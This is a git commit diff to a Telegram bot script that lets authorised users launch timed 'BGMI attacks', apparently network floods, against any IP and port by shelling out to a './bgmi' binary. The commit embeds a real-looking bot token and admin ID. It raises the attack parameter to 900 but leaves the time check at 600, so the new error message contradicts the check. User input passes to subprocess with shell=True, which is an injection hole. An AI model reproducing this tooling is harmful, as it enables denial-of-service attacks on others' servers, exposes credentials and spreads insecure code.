684104c987aa314b233dd4721430288d3987c684
MADARCHODBOT <royalpanditdata52@gmail.com>
2024-06-26 20:06:15 +0530

    Update m.py

--- m.py
+++ m.py
@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEN')
+bot = telebot.TeleBot('7472682110:AAGbl5CbZlIxPPl3BhfOS-fhcrAT6AMgWeA')
 
 # Admin user IDs
-admin_id = ["Your Id"]
+admin_id = ["6310751880"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -308,12 +308,12 @@ def handle_bgmi(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
             if time > 600:
-                response = "Error: Time interval must be less than 600."
+                response = "Error: Time interval must be less than 900."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 700"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
